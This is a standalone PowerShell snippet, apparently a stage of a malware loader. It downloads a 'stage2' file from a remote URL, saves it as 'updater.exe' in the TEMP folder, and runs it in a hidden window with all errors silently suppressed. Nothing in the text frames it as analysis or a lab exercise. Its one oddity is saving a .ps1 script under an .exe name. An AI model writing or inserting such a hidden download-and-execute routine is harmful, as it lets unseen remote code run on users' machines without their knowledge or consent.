
$RemoteUrl = "https://internal.corp/stage2.ps1"; $PayloadPath = "$env:TEMP\updater.exe"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath $PayloadPath -WindowStyle Hidden -ErrorAction SilentlyContinue; $StageMarker = "stage-31"
